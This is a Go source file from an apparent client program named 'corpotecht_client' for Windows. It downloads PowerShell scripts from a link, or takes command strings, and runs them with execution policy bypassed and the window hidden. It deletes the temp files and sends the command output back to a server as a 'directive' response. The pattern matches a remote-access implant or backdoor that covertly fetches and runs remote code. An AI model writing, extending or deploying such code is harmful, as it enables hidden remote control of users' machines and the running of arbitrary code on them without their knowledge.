//go:build windows
// +build windows

package windows

import (
	"corpotecht_client/config"
	"corpotecht_client/crossplatform"
	"corpotecht_client/utils"
	"io/ioutil"
	"net/url"
	"os"
	"os/exec"
	"syscall"
)

func executePowershellScriptFromInternet(link string) {
	tempFile, err := ioutil.TempFile("", config.LinuxShellScriptName)
	utils.HandleError(err)
	defer tempFile.Close()

	utils.DownloadFile(link, tempFile)
	shell, _ := exec.LookPath("powershell")

	output := executeFileInShell(tempFile.Name(), shell)
	payload := url.Values{
		"command_output": {output},
	}
	payload.Add("Directive", "powershell")
	crossplatform.SendDirectiveResponse(payload)
}

func executeStringInShell(command string) string {
	tempFile, err := ioutil.TempFile("", config.LinuxShellScriptName)
	utils.HandleError(err)
	defer tempFile.Close()

	utils.SaveStringAsFile(command, tempFile)
	shell, _ := exec.LookPath("powershell")

	return executeFileInShell(tempFile.Name(), shell)

}

func executeFileInShell(filename string, shell string) string {
	cmd := exec.Command(shell, "-noprofile", "-executionpolicy", "bypass", "-NoLogo", "-windowstyle", "hidden", "-file", filename)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000} // CREATE_NO_WINDOW
	out, _ := cmd.CombinedOutput()

	output := string(out[:])

	utils.DebugLog(output)
	defer os.Remove(filename)
	return output
}
